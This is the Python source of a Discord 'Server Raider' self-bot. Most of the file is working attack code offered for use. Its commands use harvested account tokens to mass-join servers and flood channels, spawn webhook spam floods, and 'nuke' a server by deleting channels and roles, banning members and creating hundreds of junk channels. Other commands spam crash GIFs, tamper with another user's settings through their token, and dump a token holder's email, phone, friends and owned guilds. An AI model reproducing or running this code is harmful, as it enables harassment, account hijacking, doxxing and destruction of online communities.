# cum
import json
import asyncio
import random
import string
import time
import functools
import threading
import sys
import os
import socket
import requests
import urllib.parse
import urllib.request
import discord
import discord.ext
from discord.ext import commands
from discord.ext import tasks
#import aiohttp
import numpy
import itertools
from itertools import cycle
import datetime, time
import colorama
from colorama import Fore
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareType
from discord import Webhook, AsyncWebhookAdapter
from discord.ext.commands import *
from discord.ext.tasks import *

terminal_title = "Server Raider Self-Bot | Made by Lotus.xml#8697"
print(f'\33]0;{terminal_title}\a', end='', flush=True)
prefix = ('.')
discordtoken = "your-token-here"

def Init():
    token = discordtoken
    try:
        bot.run(token, bot=False, reconnect=True)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"+Fore.RESET)
        os.system('pause >NUL')

prefix = ('.')
colorama.init()
intents = discord.Intents.all()
bot = discord.Client()
bot = commands.Bot(
    description='Raid Bot',
    command_prefix=prefix,
    self_bot=True,
    intents=intents
)
bot.remove_command('help') 

def Clear():
   if sys.platform == "linux":
    os.system("clear")
   elif sys.platform == "win32":
    os.system("cls")

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]
PAL = {"BANNER_COLOR":Fore.BLUE,"SYS_OUT":Fore.BLUE, "SYS_IN":Fore.GREEN, "ALERT":Fore.YELLOW, "KEY_OUT":Fore.RED, "VALUE_OUT":Fore.WHITE}
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

@bot.event
async def on_connect():
    Clear()
    print(f'''{Fore.BLUE}
    ╔╦╗┬┌─┐┌─┐┌─┐┬─┐┌┬┐  ╔═╗┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐
     ║║│└─┐│  │ │├┬┘ ││  ╚═╗├─┘├─┤││││││├┤ ├┬┘
    ═╩╝┴└─┘└─┘└─┘┴└──┴┘  ╚═╝┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─
                      {Fore.CYAN}
                    Made by:
                    Lotus.xml#8697
        
                    Logged in as: {bot.user.name}#{bot.user.discriminator}
                    ID: {bot.user.id}
                    Guilds: {len(bot.guilds)}
                    Prefix: {prefix}
                      
'''+Fore.RESET)

@bot.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cannot send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}"+Fore.RESET)

def get_random_user_agent(): # cut down that abomination but tbh you could get rid of this function entirely
    user_agent_rotator = UserAgent(software_types=WEB_BROWSER, limit=150)
    userAgent = user_agent_rotator.get_random_user_agent()
    return userAgent

@bot.command(name="tokenjoin", description="Make all your account tokens join a server.", usage="tokenjoin [delay] [invite]")
async def tokenjoin(ctx, delay:int = 1, *, invite: str):
    await ctx.message.delete()
    print(f"Trying to join server with tokens every {delay} seconds.")
    for Token in open("tokens.txt", "r").readlines():
        Token = Token.replace("\n", "")
        userAgent = get_random_user_agent()
        request = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers={
            "Authorization": Token,
            "accept": "*/*",
            "accept-language": "en-US",
            "connection": "keep-alive",
            "cookie": f"__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US",
            "DNT": "1",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://discord.com/channels/@me",
            "TE":"Trailers ",
            "User-Agent": userAgent,
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        })
        if request.status_code == 200:
           print(f"Joined successfully.")
        try:
           requests.put(f"https://discord.com/api/guilds/{request['guild']['id']}/requests/@me", headers={"Authorization": Token, "User-Agent": userAgent, "Content-Type": "application/json"}, data=json.dumps({}))
        except:
           print("Couldnt accept guild rules or they didnt exist")
        await asyncio.sleep(delay)

@bot.command(name="tokenraid", description="Raid a server with all your account tokens.", usage="tokenraid [threads] [amount] [channel id] (message)")
async def tokenraid(ctx, threadsAmount:int, amount: int, channel_id: int = None, *, text = None):
    await ctx.message.delete()
    tokens = []
    for token in open("tokens.txt", "r").readlines():
        tokens.append(token.replace("\n", ""))

    def raid():
        def sendMessages():
            message = text
            print("Started new thread.")
            for _ in range(amount):
                requests.post(f"https://discord.com/api/channels/{channel_id}/messages", headers={"Authorization": random.choice(tokens), "User-Agent": get_random_user_agent(), "Content-Type": "application/json"}, data=json.dumps({
                    "content": message 
                        }))

        print("Raid has begun.")
        threads = []
        for _ in range(threadsAmount):
            thread = threading.Thread(target=sendMessages())
            threads.append(thread)
            threads[_].start()
        for thread in threads:
            thread.join()
        print("Raid finished.")

    bot.loop.create_task(raid())

@bot.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)
                        
@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging! Please Wait!")
    ping = (time.monotonic() - before) * 1000
    await asyncio.sleep(0.1)
    await message.edit(content=f"⏳ Bot Ping: {int(ping)}ms ⌛")
    await asyncio.sleep(2.5)
    await message.edit(content=f"⌛ Bot Ping: {int(ping)}ms ⏳")
    await asyncio.sleep(2.5)
    await message.edit(content=f"⏳ Bot Ping: {int(ping)}ms ⌛")
    await asyncio.sleep(2.5)
    await message.edit(content=f"⌛ Bot Ping: {int(ping)}ms ⏳")
    await asyncio.sleep(2.5)
    await message.edit(content=f"⏳ Bot Ping: {int(ping)}ms ⌛")

def webhookspam(webhook):
    while spamwebhoook:
        data = {'content':'@everyone __**lmfao**__ @here'}
        spamming = requests.post(webhook, json=data, headers={"content-type": "application/json", "User-Agent": get_random_user_agent()})
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)

            except:
                delay = random.randint(0.5, 1)
                time.sleep(delay)
        else:
            delay = random.randint(1, 15)
            time.sleep(delay)


@bot.command()
async def stopwebhookraid(ctx):
    global spamwebhoook
    try:
        await ctx.message.delete()
    except:
        pass
    spamwebhoook = False

@bot.command()
async def webhookraid(ctx):
    global spamwebhoook
    try:
        await ctx.message.delete()

    except:
        pass
    spamwebhoook = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=webhookspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 5 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1

    for _i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                while True:
                    webhook = await channel.create_webhook(name='lol')
                    await asyncio.sleep(0.35)
                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
                    webhook = await channel.create_webhook(name='spam')
                    await asyncio.sleep(0.35)
                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
                    webhook = await channel.create_webhook(name='get fucked')
                    await asyncio.sleep(0.35)
                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
                    webhook = await channel.create_webhook(name='rip server')
                    await asyncio.sleep(0.35)
                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
                f = open(r'webhooks'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print (f"{Fore.RED}Webhook Error")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="lol",
            description="nuked",
            reason="lol get fucked",
            icon="https://media.discordapp.net/attachments/888103552109641748/901600870909763625/bot3.jpg",
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name="get fucked")
    for _i in range(250):
        await ctx.guild.create_role(name="lmfaoooo", color=RandomColor())
        
count = 0

@bot.command()
async def blankflood(ctx, *, amount: int):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send("ﾠﾠ"+"\n" * 400 + "ﾠﾠ")

#######
@bot.command(aliases=["owned"])
async def guilds(ctx, token):
    await ctx.message.delete()
    headers = {"authorization": token, "user-agent": "sxndwichVer1.0"}
    guild_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    await ctx.send("Printing owned guilds to terminal")
    print(f"{PAL['SYS_OUT']}[CAT_MAFIA]{PAL['ALERT']} Printing Owned Guilds:")
    print(f"{PAL['KEY_OUT']}--------------- ID:{PAL['VALUE_OUT']}NAME")
    for key in guild_request:
        if key['owner']:
            print(f"{PAL['KEY_OUT']}{key['id']}:{PAL['VALUE_OUT']}{key['name']}")
            time.sleep(3)

@bot.command(aliases=["settingsfucks"])
async def setfuck(ctx, token):
  await ctx.message.delete()
  await ctx.send("Spaming settings. Rip their eyes!")
  for i in range(0, 100):
        headers = {"authorization": token, "user-agent": "CATMAFIA/6.9"}
        condition_status = True
        payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
        requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
        condition_status = False
        payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
        requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)

@bot.command(aliases=["friends"])
async def frens(ctx, token):
    await ctx.message.delete()
    await ctx.send("Printing list of friends to terminal")
    #token = input(f"{PAL['SYS_OUT']}[CAT-MAFIA]{PAL['SYS_IN']} Input User Token: ")
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    r = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    )
    for friend in r.json():
        print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
        print(f"{'-'*10}")
        

@bot.command(aliases=["lagchat"])
async def lag(ctx):
        await ctx.message.delete()
        await ctx.send('https://gfycat.com/boilingmarriedcalf')
        await ctx.send("https://c.tenor.com/l21v9331sCEAAAAC/discord.gif")
        await ctx.send("https://gfycat.com/boilingmarriedcalf")
        await ctx.send("https://c.tenor.com/5wcf_RXHcDQAAAAC/car.gif")
        await ctx.send("https://gfycat.com/boilingmarriedcalf")
        await ctx.send("https://c.tenor.com/l21v9331sCEAAAAC/discord.gif")
        await ctx.send("https://gfycat.com/boilingmarriedcalf")

@bot.command()
async def logout(ctx): 
    await ctx.message.delete()
    await asyncio.sleep(0.5)
    message = await ctx.send('**Logging Out.**')
    await asyncio.sleep(0.5)
    await message.edit(content='**Logging Out..**')
    await asyncio.sleep(0.5)
    await message.edit(content='**Logging Out...**')
    await asyncio.sleep(0.5)
    await message.edit(content='**Logged out!**')
    await bot.logout()

@bot.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house): # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': discordtoken,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@bot.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    try:
        return await ctx.send(embed=em)
    except:
        return await ctx.send(f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nFlags: `{res['flags']}`\nMFA: `{res['mfa_enabled']}`\nVerified: `{res['verified']}`")

@bot.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send(f"""```
    {prefix}tokenraid [threads] [amount] [channel id] (message)
    {prefix}tokenjoin [delay] [invite code]
    {prefix}spam (amount) (message)
    {prefix}webhookraid    spams a server with webhooks
    {prefix}stopwebhookraid    stops the raid
    {prefix}nuke    nukes the server
    {prefix}ping    checks the bots ping
    {prefix}lagchat    spam discord crash gifs
    {prefix}logout    logs the bot out
    {prefix}hypesquad (hypesquad) changes hypesquad
    {prefix}tokeninfo (token) displays info on the given token
    {prefix}frens [token] displays all friends
    {prefix}setfuck [token] ddos the eyes
    {prefix}owned [token] displays all owned guilds
                           ```""")

if __name__ == '__main__':
    Init()
